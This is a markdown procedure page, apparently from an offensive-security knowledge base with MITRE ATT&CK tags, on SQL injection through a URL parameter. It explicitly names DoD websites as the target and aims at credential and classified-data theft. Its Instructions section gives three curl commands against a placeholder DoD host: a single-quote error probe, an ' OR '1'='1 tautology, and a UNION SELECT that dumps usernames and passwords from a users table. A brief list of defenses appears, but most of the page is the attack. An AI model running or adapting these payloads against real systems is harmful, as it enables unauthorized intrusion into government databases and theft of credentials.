---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
name: Demonstrate SQL Injection via URL Parameter
tags:
  - sqli
  - web
  - injection
  - dod
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-sqli-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:14.921Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Demonstrate SQL Injection via URL Parameter

## Summary

This procedure demonstrates exploiting a SQL injection vulnerability in a URL parameter on a web application, such as a DoD website, to execute arbitrary SQL commands and potentially extract sensitive database information like user credentials or classified data.

## Description

SQL injection occurs when user input in a URL parameter is not properly sanitized or parameterized, allowing attackers to append malicious SQL code. In this scenario, targeting a public-facing DoD website, the vulnerability enables execution of arbitrary queries, risking unauthorized access to sensitive military or personnel data. The attack involves crafting payloads like boolean-based or UNION-based injections to bypass authentication or dump database contents. Prerequisites include access to the website and basic knowledge of SQL syntax. Expected outcomes include database schema revelation, data exfiltration, or full compromise of the backend database.

## Requirements

1. Network access to the target DoD website over HTTP/HTTPS
2. Tool for sending HTTP requests, such as curl or a browser
3. Knowledge of common SQL payloads for the database type (e.g., MySQL, inferred from typical web apps)

## Defense

Defensive measures and detection strategies:

- Implement prepared statements and parameterized queries in application code
- Use web application firewalls (WAF) to detect and block SQL injection patterns
- Input validation and sanitization for all URL parameters
- Monitor application logs for anomalous SQL errors or unexpected query executions

## Objectives

1. Confirm the presence of SQL injection in the URL parameter
2. Execute arbitrary SQL to extract sensitive data
3. Assess the scope of data exposure without causing denial of service

## Instructions

### Step 1: Test for SQL Injection Vulnerability

**Context**: Send a basic payload to check if the application is vulnerable by observing error messages or behavioral changes in the response.

**Command** ([[commands/curl-sqli-test]]):
```bash
curl "https://dod-website.example.com/page?id=1'" -v
```

> This command appends a single quote to the id parameter, which should trigger a SQL syntax error if unsanitized. Expected output includes database error messages like "You have an error in your SQL syntax" confirming vulnerability.

### Step 2: Exploit with Boolean-Based Injection

**Context**: Use a tautology like ' OR '1'='1 to bypass any authentication or retrieve all records.

**Command** ([[commands/curl-sqli-test]]):
```bash
curl "https://dod-website.example.com/page?id=1' OR '1'='1" -v
```

> If successful, the response will return all database records instead of a single item, indicating successful injection. Look for expanded result sets in the output.

### Step 3: Extract Data with UNION Query

**Context**: Append a UNION SELECT to dump specific columns from sensitive tables, such as users or documents.

**Command** ([[commands/curl-sqli-test]]):
```bash
curl "https://dod-website.example.com/page?id=1' UNION SELECT null, username, password FROM users--" -v
```

> The response should include concatenated data from the users table. The -- comment prevents further query execution. Success is indicated by visible credentials or other sensitive info.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-sqli-test]]

## Tools Used

- [[tools/curl]]

## Tags

- [[sqli]]
- [[web]]
- [[injection]]
